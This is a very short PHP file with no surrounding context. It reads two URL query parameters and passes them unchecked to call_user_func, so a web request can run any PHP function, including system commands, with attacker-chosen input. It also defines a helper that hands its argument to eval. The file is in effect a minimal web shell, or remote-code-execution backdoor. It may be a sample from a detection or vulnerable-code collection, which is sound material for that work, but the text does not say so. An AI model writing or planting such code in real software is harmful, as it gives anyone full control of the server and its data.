<?php
$f = $_GET ["f"];
$a = $_GET ["a"];

call_user_func ( $f, $a );
function test($arg) {
	eval ( $arg );
}
?>